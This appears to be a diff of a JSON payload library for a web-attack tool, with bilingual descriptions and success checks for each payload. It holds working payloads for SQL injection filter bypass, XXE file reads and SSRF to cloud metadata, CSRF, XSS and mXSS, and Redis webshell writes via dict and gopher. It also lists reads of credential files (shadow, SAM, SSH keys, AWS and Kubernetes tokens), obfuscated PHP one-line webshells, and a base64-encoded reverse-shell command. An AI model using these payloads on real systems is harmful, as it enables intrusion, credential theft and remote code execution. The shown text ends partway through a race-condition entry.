+      "zh": "以大小写混合提交相同 UNION 语句；查询仍执行并返回与基线一致的结果即确认大小写过滤被绕过。",
+      "en": "Resubmit the same UNION with mixed case; the query still executes and returns baseline-consistent results, confirming case filtering is bypassed."
+     }
     },
     {
-      "id": "xxe-basic",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 1,
-          "expectedCommand": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">\n]>\n<root>&xxe;</root>",
-          "description": {
-            "zh": "以实体读取 Windows win.ini；回显文件内容即确认 Windows 平台文件可读。",
-            "en": "Read Windows win.ini via an entity; the file content in the response confirms readable Windows files."
-          },
-          "title": {
-            "zh": "读取文件",
-            "en": "Read File"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 2,
-          "expectedCommand": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">\n]>\n<root>&xxe;</root>",
-          "description": {
-            "zh": "以 php://filter Base64 读取 index.php；回显 Base64 串且解码得到源码即确认 PHP wrapper 可用。",
-            "en": "Read index.php via php://filter Base64; a Base64 string that decodes to source code confirms the PHP wrapper works."
-          },
-          "title": {
-            "zh": "读取PHP源码",
-            "en": "Read PHP Source Code"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 3,
-          "expectedCommand": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n]>\n<root>&xxe;</root>",
-          "description": {
-            "zh": "以实体请求云元数据地址；回显元数据 JSON 即确认解析器可发起出站请求（XXE→SSRF）。仅在授权实验中用隔离模拟端点替代真实元数据地址。",
-            "en": "Request the cloud metadata address through an entity; metadata JSON in the response confirms parser-initiated outbound requests (XXE→SSRF). Replace the real metadata address with an isolated simulator in authorized labs only."
-          },
-          "title": {
-            "zh": "SSRF攻击",
-            "en": "SSRF attack"
-          }
-        }
-      ]
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "' /*!UNION*/ /*!SELECT*/ 1,database(),3--\n' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
+     "description": {
+      "zh": "用 MySQL 版本注释 /*!*/ 包裹关键字提交；第一条语句回显 database() 值、第二条返回与基线一致的占位结果，即确认版本注释绕过有效。",
+      "en": "Wrap keywords in MySQL version comments; the statement still executes and returns database(), confirming the version-comment bypass works."
+     }
     },
     {
-      "id": "csrf-basic",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 0,
-          "expectedCommand": "<!doctype html>\n<meta charset=\"utf-8\">\n<form action=\"http://127.0.0.1:18080/lab/csrf/profile-email\" method=\"post\">\n  <input type=\"hidden\" name=\"email\" value=\"csrf-a1@lab.invalid\">\n  <input type=\"hidden\" name=\"marker\" value=\"CSRF_FORM_A1\">\n  <button type=\"submit\">Submit local CSRF marker</button>\n</form>\n<script>document.forms[0].requestSubmit();</script>",
-          "description": {
-            "zh": "构造自动提交的 CSRF 表单并指向目标状态变更端点；表单加载即自动提交，目标端点收到携带会话 Cookie 的 POST 且合成 email/marker 发生变化，即确认该请求形状可被跨站伪造。",
-            "en": "Build an auto-submitting CSRF form pointing at the target state-changing endpoint; if submission fires on load and the endpoint receives the POST with ambient cookies and the synthetic email/marker changes, cross-site forgery of this request shape is confirmed."
-          },
-          "title": {
-            "zh": "构造CSRF表单",
-            "en": "Construct CSR Ftable Single"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 1,
-          "expectedCommand": "<img src=\"http://127.0.0.1:18080/lab/csrf/state-change-get?marker=CSRF_GET_B2\" alt=\"CSRF_GET_B2\">",
-          "description": {
-            "zh": "用 img 标签触发 GET 状态变更请求；服务端日志显示该 GET 携带会话 Cookie 并改变合成状态，即确认 GET 型 CSRF。",
-            "en": "Trigger a state-changing GET via an img tag; if the server log shows the GET carried the session cookie and changed synthetic state, GET-based CSRF is confirmed."
-          },
-          "title": {
-            "zh": "GET请求CSRF",
-            "en": "GET Request CSRF"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 2,
-          "expectedCommand": "<script>\nfetch(\"http://127.0.0.1:18080/lab/csrf/json-compatible\", {\n  method: \"POST\",\n  credentials: \"include\",\n  headers: {\"Content-Type\": \"text/plain\"},\n  body: JSON.stringify({marker: \"CSRF_TEXT_C3\"})\n}).then(response => document.body.dataset.status = String(response.status));\n</script>",
-          "description": {
-            "zh": "以 text/plain 的 Fetch 发送 JSON 语义请求体；服务端把它当作 JSON 解析并接受状态变更，即确认简单请求绕过内容类型限制。",
-            "en": "Send a JSON-semantic body as text/plain via fetch; if the server parses it as JSON and accepts the state change, the simple-request content-type bypass is confirmed."
-          },
-          "title": {
-            "zh": "JSON CSRF",
-            "en": "JSON CSRF"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 3,
-          "expectedCommand": "<a href=\"http://127.0.0.1:18080/lab/csrf/navigation?marker=CSRF_NAV_D4\">CSRF_NAV_D4</a>",
-          "description": {
-            "zh": "诱导点击链接触发顶级导航 GET；目标端点在导航中携带会话并改变合成状态，即确认链接型 CSRF。",
-            "en": "Lure a click on the link to trigger a top-level navigation GET; if the endpoint receives ambient credentials during navigation and the synthetic state changes, link-based CSRF is confirmed."
-          },
-          "title": {
-            "zh": "链接诱导",
-            "en": "Link enticement"
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 0,
-          "expectedCommand": "<!doctype html>\n<meta name=\"referrer\" content=\"no-referrer\">\n<form action=\"http://127.0.0.1:18080/lab/csrf/referer-control\" method=\"post\">\n  <input type=\"hidden\" name=\"marker\" value=\"CSRF_NOREF_E5\">\n  <button type=\"submit\">Submit no-referrer control</button>\n</form>",
-          "description": {
-            "zh": "以 no-referrer 提交对照表单；缺失 Referer 的请求仍被接受且状态变化，即确认 Referer 校验可被空 Referer 绕过。",
-            "en": "Submit the control form with no-referrer; if the Referer-less request is still accepted and state changes, Referer validation is bypassable via empty Referer."
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 1,
-          "expectedCommand": "<!doctype html>\n<form action=\"http://127.0.0.1:18080/lab/csrf/token-control\" method=\"post\">\n  <input type=\"hidden\" name=\"marker\" value=\"CSRF_TOKEN_F6\">\n  <button type=\"submit\">Submit missing-token control</button>\n</form>",
-          "description": {
-            "zh": "提交缺失 CSRF Token 的对照表单；无 Token 请求仍被接受且状态变化，即确认 Token 校验未强制。",
-            "en": "Submit the control form without a CSRF token; if the token-less request is accepted and state changes, token validation is not enforced."
-          }
-        }
-      ]
+     "area": "wafBypass",
+     "index": 2,
+     "expectedCommand": "' UNUNIONION SELSELECTECT 1,database(),3--\n' UNIunionON SELselectECT 1,2,3--",
+     "description": {
+      "zh": "双写关键字提交；过滤器单次替换删除后剩余关键字拼回有效语句并返回相同结果即确认双写绕过有效。",
+      "en": "Submit double-written keywords; after a single-pass replacement filter deletes one copy, the remainder reassembles into a valid statement with identical results, confirming the double-write bypass."
+     }
     },
     {
-      "id": "xss-mxss",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 0,
-          "expectedCommand": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
-          "description": {
-            "zh": "利用 noscript 解析差异构造属性逃逸；渲染后 img 载荷执行即确认 mXSS 成立。",
-            "en": "Exploit noscript parsing differences for attribute breakout; the img payload executing after rendering confirms mXSS."
-          },
-          "title": {
-            "zh": "基础mXSS探测",
-            "en": "Basicm XSS Detect"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 1,
-          "expectedCommand": "<svg><![CDATA[<img src=x onerror=alert(1)>]]></svg>\n<svg><script><![CDATA[alert(1)]]></script></svg>",
-          "description": {
-            "zh": "以 SVG CDATA 突变提交；解析突变后脚本执行即确认 SVG 命名空间 mXSS。",
-            "en": "Submit SVG CDATA mutations; script execution after parser mutation confirms SVG-namespace mXSS."
-          },
-          "title": {
-            "zh": "SVG m XSS",
-            "en": "SVG m XSS"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 2,
-          "expectedCommand": "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
-          "description": {
-            "zh": "以 MathML mglyph/style 突变提交；突变后 img 执行即确认 MathML mXSS。",
-            "en": "Submit MathML mglyph/style mutations; img execution after mutation confirms MathML mXSS."
-          },
-          "title": {
-            "zh": "Math m XSS",
-            "en": "Math m XSS"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 3,
-          "expectedCommand": "<form id=x></form><form id=x><img src=x onerror=alert(1)></form>",
-          "description": {
-            "zh": "以重复 id 表单触发 DOM clobbering 配合载荷；覆盖生效并执行即确认 clobbering 可助攻触发。",
-            "en": "Trigger DOM clobbering with duplicate-id forms alongside the payload; the override taking effect and firing confirms clobbering assists execution."
-          },
-          "title": {
-            "zh": "DOM clobbering配合",
-            "en": "DOM clobbering combination"
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 0,
-          "expectedCommand": "<svg><script>&#97;lert(1)</script></svg>\n<svg><script>a&#108;ert(1)</script></svg>",
-          "description": {
-            "zh": "以 SVG 内实体编码脚本提交；解码后执行即确认 SVG 脚本编码绕过有效。",
-            "en": "Submit entity-encoded scripts inside SVG; execution after decoding confirms the SVG script-encoding bypass."
-          }
-        }
-      ]
+     "area": "wafBypass",
+     "index": 3,
+     "expectedCommand": "'/**/UNION/**/SELECT/**/1,database(),3--\n' %0aUNION%0aSELECT%0a1,2,3--\n'(UNION(SELECT(1),(database()),(3)))--",
+     "description": {
+      "zh": "用注释、换行、括号替代空格提交；语句仍解析执行并返回相同结果即确认空格过滤被绕过。",
+      "en": "Replace spaces with comments, newlines, or parentheses; the statement still parses and returns identical results, confirming space filtering is bypassed."
+     }
     },
     {
-      "id": "xss-encoding",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 0,
-          "expectedCommand": "<img src=x onerror=%61lert(1)>\n%3Cscript%3Ealert(1)%3C/script%3E",
-          "description": {
-            "zh": "URL 编码标签提交；解码后执行即确认单层解码差异可利用。",
-            "en": "Submit URL-encoded tags; execution after decoding confirms exploitable single-pass decoding."
-          },
-          "title": {
-            "zh": "URL编码",
-            "en": "URL Encoding"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 1,
-          "expectedCommand": "<img src=x onerror=&#97;lert(1)>\n<img src=x onerror=&#x61;lert(1)>\n&lt;script&gt;alert(1)&lt;/script&gt;",
-          "description": {
-            "zh": "HTML 实体编码提交；解码后执行即确认实体解码差异可利用。",
-            "en": "Submit HTML-entity encoded payloads; execution after decoding confirms exploitable entity decoding."
-          },
-          "title": {
-            "zh": "HTML实体编码",
-            "en": "HTML-entity encoding"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 2,
-          "expectedCommand": "<img src=x onerror=\"\\u0061lert(1)\">\n<img src=x onerror=\"\\x61lert(1)\">\n<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
-          "description": {
-            "zh": "JS 十六进制/八进制/atob 编码提交；求值后执行即确认 JS 解码层绕过有效。",
-            "en": "Submit JS hex/octal/atob encodings; execution after evaluation confirms the JS decode-layer bypass."
-          },
-          "title": {
-            "zh": "JavaScript编码",
-            "en": "Java Script Encoding"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 3,
-          "expectedCommand": "<style>body{background:url(\"javascript:alert(1)\")}</style>\n<div style=\"x:expression(alert(1))\">",
-          "description": {
-            "zh": "以 CSS expression（旧版 IE）提交；表达式执行即确认旧引擎下 CSS 编码层可利用。",
-            "en": "Submit CSS expression payloads (legacy IE); expression execution confirms the CSS encode layer is exploitable on legacy engines."
-          },
-          "title": {
-            "zh": "CSS编码",
-            "en": "CSSEncoding"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 4,
-          "expectedCommand": "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">\n<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)\">click</a>",
-          "description": {
-            "zh": "混合多层编码提交；逐层解码后执行即确认多层解码链差异可利用。",
-            "en": "Submit multi-layer mixed encodings; execution after layered decoding confirms exploitable multi-decode chains."
-          },
-          "title": {
-            "zh": "混合编码",
-            "en": "Mixed encoding"
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 1,
-          "expectedCommand": "%00%3C%00s%00c%00r%00i%00p%00t%00%3Ealert(1)%00%3C/s%00c%00r%00i%00p%00t%00%3E",
-          "description": {
-            "zh": "以 UTF-16 编码标签提交；按 UTF-16 解码后执行即确认编码声明差异可利用。",
-            "en": "Submit UTF-16 encoded tags; execution after UTF-16 decoding confirms exploitable encoding-declaration differences."
-          }
-        }
-      ]
+     "area": "wafBypass",
+     "index": 4,
+     "expectedCommand": "' UNION SELECT 1,hex(database()),3--\n' UNION SELECT 1,unhex(hex(database())),3--\n' UNION SELECT 1,conv(hex(database()),16,10),3--",
+     "description": {
+      "zh": "用 hex/unhex/conv 包裹 database() 提交；回显出现十六进制或十进制编码的库名且可还原即确认关键字检测被绕过。",
+      "en": "Wrap database() with hex/unhex/conv; the encoded database name appears in the response and decodes back, confirming keyword detection is bypassed."
+     }
     },
     {
-      "id": "ssrf-dict",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 0,
-          "expectedCommand": "dict://{TARGET}:{TARGET_PORT}/{COMMAND}",
-          "description": {
-            "zh": "向目标主机与端口发送 dict 探测命令；捕获器收到探测命令行即确认 dict scheme 端口边界。",
-            "en": "Send the dict probe command to the target host and port; the capture service receiving the command line confirms the dict-scheme port boundary."
-          }
-        },
-        {
-          "area": "execution",
-          "index": 1,
-          "expectedCommand": "dict://127.0.0.1:6379/info\ndict://127.0.0.1:6379/keys%20*",
-          "description": {
-            "zh": "对回环 6379 发送 info 与 keys 命令；返回 Redis 信息或键列表即确认 dict 可与 Redis 交互。",
-            "en": "Send info and keys to loopback 6379; a returned Redis info block or key list confirms dict interaction with Redis."
-          }
-        },
-        {
-          "area": "execution",
-          "index": 2,
-          "expectedCommand": "dict://127.0.0.1:11211/stats\ndict://127.0.0.1:11211/get%20key",
-          "description": {
-            "zh": "对回环 11211 发送 stats 与 get 命令；返回统计文本或键值即确认 Memcached 可经 dict 探测。",
-            "en": "Send stats and get to loopback 11211; returned stats text or key values confirms Memcached probing via dict."
-          }
-        },
-        {
-          "area": "execution",
-          "index": 3,
-          "expectedCommand": "dict://127.0.0.1:6379/set%20shell%20\"<?php @eval($_POST[cmd]);?>\"\ndict://127.0.0.1:6379/config%20set%20dir%20/var/www/html\ndict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php\ndict://127.0.0.1:6379/save",
-          "description": {
-            "zh": "按序执行 set、config、save 序列；Web 根目录出现 shell.php 且可被解析，即确认 dict 可写入 WebShell。",
-            "en": "Execute the set, config, and save sequence in order; shell.php appearing in the web root and parsing confirms WebShell writing via dict."
-          },
-          "title": {
-            "zh": "Redis写入文件",
-            "en": "Redis Write File"
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 0,
-          "expectedCommand": "dict://127.0.0.1:6379/%73%65%74%20...\nURLPAYLOADER_LAB",
-          "description": {
-            "zh": "提交百分号编码的命令变体；捕获器解码后收到 set 命令，即确认编码绕过单层过滤。",
-            "en": "Submit the percent-encoded command variant; a decoded set command on the capture service confirms encoding bypasses single-pass filtering."
-          }
-        }
-      ]
-    },
-    {
-      "id": "ssrf-file",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 0,
-          "expectedCommand": "file:///etc/passwd\nfile:///etc/shadow\nfile:///etc/hosts\nfile:///etc/resolv.conf\nfile:///proc/self/environ\nfile:///proc/self/cmdline",
-          "description": {
-            "zh": "逐条读取 Linux 敏感文件；返回对应文件内容即确认 file scheme 可读且路径未被过滤。",
-            "en": "Read each sensitive Linux file; returned content confirms the file scheme is readable and paths are unfiltered."
-          },
-          "title": {
-            "zh": "Linux敏感文件",
-            "en": "Linux Sensitive Files"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 1,
-          "expectedCommand": "file:///c:/windows/win.ini\nfile:///c:/windows/system32/config/sam\nfile:///c:/users/administrator/.ssh/id_rsa\nfile:///c:/inetpub/logs/logfiles/",
-          "description": {
-            "zh": "逐条读取 Windows 敏感文件；返回 win.ini、SAM 或私钥内容即确认 Windows 路径可读。",
-            "en": "Read each sensitive Windows file; returned win.ini, SAM, or key content confirms Windows paths are readable."
-          },
-          "title": {
-            "zh": "Windows敏感文件",
-            "en": "Windows Sensitive Files"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 2,
-          "expectedCommand": "file:///var/www/html/config.php\nfile:///var/www/html/wp-config.php\nfile:///app/config/database.yml\nfile:///app/.env",
-          "description": {
-            "zh": "逐条读取 Web 应用配置；返回数据库连接串或应用密钥即确认配置文件可被窃取。",
-            "en": "Read each web-application configuration file; returned connection strings or application secrets confirm configuration theft."
-          },
-          "title": {
-            "zh": "Web配置文件",
-            "en": "Web Configuration File"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 3,
-          "expectedCommand": "file:///var/run/secrets/kubernetes.io/serviceaccount/token\nfile:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt\nfile:///home/user/.aws/credentials",
-          "description": {
-            "zh": "逐条读取云环境凭据文件；返回 serviceaccount token 或 AWS credentials 即确认云凭据可被窃取。",
-            "en": "Read each cloud-credential file; a returned serviceaccount token or AWS credentials file confirms cloud-credential theft."
-          },
-          "title": {
-            "zh": "云环境文件",
-            "en": "Cloud environment files"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 4,
-          "expectedCommand": "file:///home/user/.ssh/id_rsa\nfile:///home/user/.ssh/authorized_keys\nfile:///root/.ssh/id_rsa",
-          "description": {
-            "zh": "逐条读取 SSH 私钥路径；返回 OPENSSH PRIVATE KEY 内容即确认私钥可被窃取。",
-            "en": "Read each SSH private-key path; returned OPENSSH PRIVATE KEY content confirms private-key theft."
-          },
-          "title": {
-            "zh": "SSH密钥",
-            "en": "SSHkey"
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 0,
-          "expectedCommand": "FILE:///etc/passwd\nFile:///etc/passwd\nfile:///ETC/PASSWD",
-          "description": {
-            "zh": "以大小写混合提交 file scheme 与路径；混合大小写仍返回内容而标准形式被拦，即确认大小写校验缺口。",
-            "en": "Submit the file scheme and paths in mixed case; mixed-case content while the canonical form is blocked confirms a case-check gap."
-          }
-        }
-      ]
-    },
-    {
-      "id": "ssrf-redis",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 0,
-          "expectedCommand": "dict://127.0.0.1:6379/info\ngopher://127.0.0.1:6379/_INFO",
-          "description": {
-            "zh": "对回环 6379 发送 dict info 与 gopher PING；返回 Redis 信息或 +PONG 即确认 Redis 可达。",
-            "en": "Send dict info and a gopher PING to loopback 6379; returned Redis info or +PONG confirms Redis reachability."
-          }
-        },
-        {
-          "area": "execution",
-          "index": 1,
-          "expectedCommand": "dict://127.0.0.1:6379/set%20shell%20\"<?php @eval($_POST[cmd]);?>\"\ndict://127.0.0.1:6379/config%20set%20dir%20/var/www/html\ndict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php\ndict://127.0.0.1:6379/save",
-          "description": {
-            "zh": "按序执行 set、config、save 序列写入 WebShell；Web 根出现 shell.php 且可解析即确认持久化成功。",
-            "en": "Execute the set, config, and save sequence to write a WebShell; shell.php appearing in the web root and parsing confirms persistence."
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 0,
-          "expectedCommand": "gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0APING%0D%0A",
-          "description": {
-            "zh": "提交 RESP PING 帧；返回 +PONG 即确认 gopher 到 Redis 的单命令链路。",
-            "en": "Submit the RESP PING frame; a +PONG reply confirms the single-command gopher-to-Redis path."
-          }
-        }
-      ]
-    },
-    {
-      "id": "rce-php",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 0,
-          "expectedCommand": "eval($_POST[cmd]);\nassert($_POST[cmd]);\npreg_replace('/a/e',$_POST[cmd],'a');\ncreate_function('',$_POST[cmd]);\narray_map($_POST[func],$_POST[arr]);\ncall_user_func($_POST[func],$_POST[arg]);",
-          "description": {
-            "zh": "列举 eval、assert、preg_replace /e、create_function、array_map、call_user_func 等动态执行形态。命中判据：对应参数传入后返回执行结果（如 cmd=id 返回 uid=…）。",
-            "en": "Lists dynamic-execution forms such as eval, assert, preg_replace /e, create_function, array_map, and call_user_func. Success check: passing the paired parameters returns executed output (e.g. cmd=id yields uid=...)."
-          },
-          "title": {
-            "zh": "常见危险函数",
-            "en": "common Dangerous Function"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 1,
-          "expectedCommand": "system('whoami');\nexec('whoami');\nshell_exec('whoami');\npassthru('whoami');\npopen('whoami','r');\nproc_open('whoami',$desc,$pipes);\n`whoami`;",
-          "description": {
-            "zh": "列举 system、exec、shell_exec、passthru、popen、proc_open 与反引号的命令执行形态。命中判据：页面输出 whoami 的当前用户名。",
-            "en": "Lists command-execution forms of system, exec, shell_exec, passthru, popen, proc_open, and backticks. Success check: the page prints the current username from whoami."
-          },
-          "title": {
-            "zh": "命令执行",
-            "en": "Command Execution"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 2,
-          "expectedCommand": "<?php @eval($_POST[cmd]);?>\n<?php @assert($_POST[cmd]);?>\n<?php @system($_GET[cmd]);?>\n<?php $a=create_function('',$_POST[cmd]);$a();?>",
-          "description": {
-            "zh": "部署 @eval/@assert/@system 一句话木马后通过 cmd 参数连接。命中判据：POST cmd=id 后响应包含 uid=… 输出。",
-            "en": "Deploys @eval/@assert/@system one-line webshells and connects through the cmd parameter. Success check: posting cmd=id returns uid=... output."
-          },
-          "title": {
-            "zh": "一句话木马",
-            "en": "One-liner webshell"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 3,
-          "expectedCommand": "<?php $_POST[1]($_POST[cmd]);?>\n<?php $_='a'.'s'.'s'.'e'.'r'.'t';$_($_POST[cmd]);?>\n<?php $a=base64_decode('YXNzZXJ0');$a($_POST[cmd]);?>",
-          "description": {
-            "zh": "用动态属性调用、函数名拼接与 Base64 还原 assert 构造变形一句话。命中判据：传入 cmd 后同样返回命令输出。",
-            "en": "Builds obfuscated one-line webshells with dynamic property calls, concatenated names, and Base64-restored assert. Success check: passing cmd likewise returns command output."
-          },
-          "title": {
-            "zh": "变形一句话",
-            "en": "Variant one-liner webshell"
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 0,
-          "expectedCommand": "array_map('assert',array($_POST[cmd]));\ncall_user_func('assert',$_POST[cmd]);\n$a='assert';$a($_POST[cmd]);",
-          "description": {
-            "zh": "经 array_map、call_user_func 与变量函数间接调用 assert。命中判据：cmd 参数传入后返回命令输出。",
-            "en": "Invokes assert indirectly via array_map, call_user_func, and variable functions. Success check: passing cmd returns command output."
-          }
-        },
-        {
-          "area": "wafBypass",
-          "index": 1,
-          "expectedCommand": "$func=$_GET['func'];$cmd=$_GET['cmd'];$func($cmd);",
-          "description": {
-            "zh": "由 GET 参数 func 与 cmd 决定动态调用。命中判据：func=assert&cmd=id 时响应包含 uid=…。",
-            "en": "Lets GET parameters func and cmd drive the dynamic call. Success check: func=assert&cmd=id yields uid=... in the response."
-          }
-        }
-      ]
-    },
-    {
-      "id": "rce-php-filter",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 3,
-          "expectedCommand": "?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp",
-          "description": {
-            "zh": "提交 iconv 与 base64 组合的完整 php://filter 链作为包含参数。命中判据：包含执行后输出经链变换的可控内容（按链解码还原为种子 PHP 代码）。",
-            "en": "Submits a full php://filter chain combining iconv and base64 as the inclusion parameter. Success check: inclusion emits chain-transformed controllable content that decodes back to the seed PHP code."
-          },
-          "title": {
-            "zh": "完整利用示例",
-            "en": "complete Exploitationexample"
-          }
-        }
-      ]
-    },
-    {
-      "id": "rce-cmd-blind",
-      "patches": [
-        {
-          "area": "wafBypass",
-          "index": 0,
-          "expectedCommand": "; echo \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==\" | base64 -d | bash",
-          "description": {
-            "zh": "将反弹 Shell 命令 Base64 编码后经 echo|base64 -d|bash 解码执行，验证绕过对明文反弹命令关键字的过滤。复制后需将 Base64 解码内容中的回连 IP 与端口改为自有监听地址并重新编码。命中判据：过滤器放行该请求且监听器收到反弹连接。",
-            "en": "Base64-encodes a reverse-shell command and runs it through echo|base64 -d|bash to bypass plaintext-keyword filtering. After copying, change the callback IP and port inside the Base64-decoded content to your own listener and re-encode. Success check: the filter lets the request pass and the listener receives the reverse connection."
-          }
-        }
-      ]
-    },
-    {
-      "id": "rce-image",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 2,
-          "expectedCommand": "?file=upload/shell.jpg\nPOST: cmd=system('whoami');\n?file=phar://upload/shell.jpg",
-          "description": {
-            "zh": "经文件包含参数与 phar:// 流访问已上传的 shell.jpg，验证图片内 PHP 代码或元数据在包含/解析时执行。命中判据：包含 shell.jpg 后传入 cmd=whoami 返回当前用户名。",
-            "en": "Reach the uploaded shell.jpg through an inclusion parameter and the phar:// stream, verifying embedded PHP code or metadata executes on inclusion or parsing. Success check: including shell.jpg with cmd=whoami returns the current username."
-          }
-        }
-      ]
-    },
-    {
-      "id": "xxe-ssrf",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 0,
-          "expectedCommand": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"http://192.168.1.1:22\">\n]>\n<foo>&xxe;</foo>\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"http://192.168.1.1:80\">\n]>\n<foo>&xxe;</foo>\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"http://192.168.1.1:443\">\n]>\n<foo>&xxe;</foo>",
-          "description": {
-            "zh": "对 192.168.1.1 的 22、80、443 端口各生成一个独立完整 XML 样例并逐个提交；以响应时间与错误差异区分端口连通性，某端口响应特征不同即确认解析器可达该内网端口。",
-            "en": "Generate one independent XML sample per port (22/80/443) on 192.168.1.1 and submit them one at a time; response-time and error differences distinguish reachability, and a distinctive response on a port confirms the parser reaches that intranet port."
-          },
-          "title": {
-            "zh": "内网端口逐一探测（22/80/443）",
-            "en": "Per-port intranet probing (22/80/443)"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 1,
-          "expectedCommand": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"http://127.0.0.1:6379/info\">\n]>\n<foo>&xxe;</foo>",
-          "title": {
-            "zh": "本机 Redis 端点探测",
-            "en": "Local Redis endpoint probe"
-          }
-        }
-      ]
-    },
-    {
-      "id": "xxe-file-read",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 1,
-          "expectedCommand": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">\n]>\n<foo>&xxe;</foo>",
-          "description": {
-            "zh": "用内部实体读取 win.ini 验证 Windows 文件读取；回显出现 win.ini 内容即确认读取成功。其余可选目标：file:///c:/windows/system32/config/sam、file:///c:/users/administrator/.ssh/id_rsa。",
-            "en": "Read win.ini via an internal entity to confirm Windows file read; win.ini content in the response confirms success. Other candidate targets: file:///c:/windows/system32/config/sam, file:///c:/users/administrator/.ssh/id_rsa."
-          },
-          "title": {
-            "zh": "读取 Windows win.ini",
-            "en": "Read Windows win.ini"
-          }
-        }
-      ]
-    },
-    {
-      "id": "xxe-dtd",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 2,
-          "expectedCommand": "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % start \"<![CDATA[\">\n<!ENTITY % end \"]]>\">\n<!ENTITY % all \"%start;%file;%end;\">",
-          "title": {
-            "zh": "CDATA 包裹参数实体块",
-            "en": "CDATA-wrapped parameter entity block"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 3,
-          "expectedCommand": "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\n%eval;\n%error;",
-          "title": {
-            "zh": "报错式参数实体外带块",
-            "en": "Error-based parameter entity block"
-          }
-        }
-      ]
-    },
-    {
-      "id": "biz-race-condition",
-      "patches": [
-        {
-          "area": "execution",
-          "index": 0,
-          "expectedCommand": "# 典型竞态场景：\n# 1. 优惠券领取 POST /api/coupon/claim\n# 2. 余额提现 POST /api/withdraw\n# 3. 积分兑换 POST /api/points/exchange\n# 4. 限量商品抢购 POST /api/order/create\n# 5. 投票/点赞 POST /api/vote",
-          "description": {
-            "zh": "从领取、提现、兑换、抢购、投票等典型场景中锁定一个状态递减端点；取得该端点的正常响应与资源数量基线，即完成竞态目标识别。",
-            "en": "Lock onto one state-decreasing endpoint among claim, withdrawal, exchange, purchase, and voting scenarios; capturing its normal response and resource-count baseline completes race-target identification."
-          },
-          "title": {
-            "zh": "识别竞态目标",
-            "en": "Identify race condition target"
-          }
-        },
-        {
-          "area": "execution",
-          "index": 2,
